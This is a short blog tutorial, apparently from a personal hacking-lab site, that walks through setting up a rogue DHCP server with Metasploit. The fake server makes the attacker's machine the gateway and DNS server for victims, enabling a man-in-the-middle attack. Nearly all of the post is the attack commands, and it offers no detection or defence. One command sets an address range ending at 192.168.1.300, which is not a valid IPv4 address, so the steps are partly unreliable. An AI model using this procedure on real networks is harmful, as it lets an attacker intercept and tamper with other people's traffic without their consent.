---
layout: post
title: Create Fake DHCP Using Metasploit  
categories: [Hacking-Lab]
#subtitle: Excerpt from Soulshaping by Jeff Brown
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/thumb.png
share-img: /assets/img/path.jpg
tags: [fake dhcp, dhcp spoofing ]
---
There is a dangerous type of cyber attack called Man In The Middle. Attacker can make all network traffic go through their system.  
One of the ways of this attack is that the attacker has to make the system being attacked to recognize the attacker's system as the gateway(router)    
that sends all network traffic through here. There are many ways to do this, and the popular way is fake DHCP server.  
## 1. Network Model:  
* **gateway: 192.168.1.1** 
* **netmask: 255.255.255.0**  
* **attacker: 192.168.1.92**  


## 2. Create Fake DHCP:  
Open Metasploit:  
```
msfconsole
```  
```
use auxiliary/server/dhcp
```  
```
show options
```
![](/assets/img/2020-27-2-show-options.png)

Setup DHCP server:  
```
set dhcpipstart 192.168.1.200
```
```
set dhcpipend 192.168.1.300
```
```
set netmask 255.255.255.0
```
```
set broadcast 192.168.1.255
```
```
set router 192.168.1.92
```
```
set dnsserver 192.168.1.92
```
```
set srvhost 192.168.1.92
```
```
run
```
Network information of another machine before and after run fake DHCP:  
*before*  

![](/assets/img/2020-27-2-before.png)  

*after*  

![](/assets/img/2020-27-2-after.png)

